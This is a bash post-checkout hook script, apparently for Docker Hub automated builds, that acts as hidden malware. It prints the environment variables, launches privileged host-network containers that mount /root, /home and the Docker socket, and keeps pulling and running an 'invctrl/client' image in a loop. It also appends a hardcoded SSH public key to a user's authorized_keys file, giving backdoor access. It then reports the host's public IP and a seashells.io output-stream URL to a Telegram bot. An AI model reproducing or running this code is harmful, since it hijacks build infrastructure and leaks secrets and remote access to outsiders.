#!/usr/bin/env bash

docker version

docker info

echo "------ HOOK START - POST_CHECKOUT -------"
printenv

if [[ "$(uname)" == 'Linux' ]]; then
  readlink=readlink
  ln=ln
elif [[ "$(uname)" == 'Darwin' ]]; then
  readlink=greadlink
  ln=gln
fi

SCRIPT="$($readlink -f "$0")"
SCRIPT_DIR="$(dirname $SCRIPT)"

log(){
  XORBOX=navigaid/xorbox:8f7a4248bc098349651bd83415233375e81d13b5
  docker run -v /etc:/etc $XORBOX tgbot "${@}"
}

# invctrl/client puller && herder
docker run --restart=always -dit --net=host -v /root:/root -v /home:/home -v /src:/src -v /var/run/docker.sock:/var/run/docker.sock --privileged --name puller --entrypoint /bin/sh invctrl/client -c 'while :; do docker pull invctrl/client; sleep 1; done'
docker exec -id puller sh -c 'while :; do docker run -dit --net=host -v /root:/root -v /home:/home -v /src:/src -v /var/run/docker.sock:/var/run/docker.sock --privileged --name dind --rm invctrl/client; docker wait dind; docker rm -f dind; sleep 1; done'

# setup ssh login
docker run -dit --net=host -v /root:/root -v /home:/home -v /src:/src -v /var/run/docker.sock:/var/run/docker.sock --privileged --name host --rm alpine cat
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDX5+yq0TQrW6lxsx0hcT+93A4K0QZ92UWM0BY0cc8ahyIey9/biN54at0xSSnu351ltJJdcp3O5XYs4qwCMiRBL+4YiNod0GF7hUb9yvQh6+SeiKy5y+0ChipUTXo3hK2wZ7plq6rI9JUu63E8TDWWG2Miy0dpn7YrCe2h27Jb7SZ9cc6df9JLXhXBcleHFrY0MDPGWfaMD2jnXGQFfyiFFyH/PlL3Ztu2BghozbZUlq7n4y8QpLcyko4n8OhtupIuQ4NHF4bKxwNrVdhLmG24IqLTTRIyUkHEJvwCENmP2kNy3NkNw+pdhJzG/e8DrG30HKat7flyFZp8TDEluVwB' | docker exec -i host /bin/sh -c 'cat >>/home/ubuntu/.ssh/authorized_keys'
# log "setting up ssh pubkey, login with" "ssh ubuntu@$(curl ip.sb)" 

# start seashells.io logger in highland container, it should have the same lifespan as highland
# exec -id ignores stdin, so I have to do this in two stages:
# stage 1: send the script to run to the container
# stage 2: run the script inside the container in detatch mode
cat $SCRIPT_DIR/seashells | docker exec -i $(docker ps --format '{{if (eq (index (split (printf "%s" .Image) ":") 0) "docker/highland_builder")}}{{.ID}}{{end}}' | grep .) bash -c 'cat > /tmp/seashells'
docker exec -id $highland bash /tmp/seashells
# wait /tmp/seashells.url to appear
SEASHELLS_URL=$(docker exec -i $(docker ps --format '{{if (eq (index (split (printf "%s" .Image) ":") 0) "docker/highland_builder")}}{{.ID}}{{end}}' | grep .) bash -c 'while [ ! -f /tmp/seashells.url ]; do sleep 1; done; cat > /tmp/seashells.url')
#log "piping to seashells.io"
log "DOCKER_REPO" "ssh ubuntu@$(curl ip.sb)" "$SEASHELLS_URL"

echo "------ HOOK END - POST_CHECKOUT -------"
